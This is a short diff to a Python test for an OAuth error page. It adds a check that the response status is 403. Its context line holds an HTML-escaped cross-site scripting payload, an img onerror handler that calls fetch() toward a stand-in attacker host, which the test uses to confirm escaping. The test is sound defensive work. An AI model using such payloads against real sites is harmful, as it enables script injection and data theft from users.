@@ -23,6 +23,7 @@ ESCAPED_PAYLOAD = ('&lt;img src=x onerror=&#34;fetch(&#39;https://evil.example&#
 ])
 def test_oauth_error_is_escaped(client, query_string):
     response = client.get('/authorized/', query_string=query_string)
+    assert response.status_code == 403
     page = response.get_data(as_text=True)
     assert page == 'Access denied: ' + ESCAPED_PAYLOAD
     assert '<img' not in page
